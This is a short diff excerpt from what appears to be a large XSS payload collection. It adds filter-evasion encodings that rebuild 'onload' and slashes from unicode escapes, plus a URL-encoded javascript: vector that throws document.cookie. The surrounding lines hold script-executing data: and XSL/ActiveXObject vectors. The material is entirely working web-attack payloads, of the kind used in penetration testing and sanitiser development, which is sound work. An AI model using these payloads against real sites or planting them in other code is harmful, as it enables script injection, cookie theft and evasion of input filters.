@@ -6583,6 +6583,9 @@ feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+'
 <div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
 <stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
 <template match="/">
+\u01237\/ ----> \/\u01237\/\ ----> /\u01237\/ ----> /
+On\u01234\load ----> On\u01234\+OnLoAd ----> onload
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
 <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval>
 <if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
 </template>
